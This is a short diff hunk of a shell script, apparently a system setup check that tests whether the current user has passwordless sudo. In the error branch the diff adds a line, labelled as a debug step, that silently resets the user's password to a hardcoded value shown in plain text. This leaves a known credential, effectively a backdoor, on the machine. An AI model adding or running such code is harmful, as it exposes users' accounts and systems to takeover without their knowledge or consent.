@@ -25,6 +25,8 @@ if _main; then
         echo "User $USER has passwordless sudo access."
     else
         echo "Error: User $USER does not have passwordless sudo access"; 
+        # Set DEBUG password
+        chpasswd <<<"$USER:Ronindojo369"
         exit 1;
     fi
     
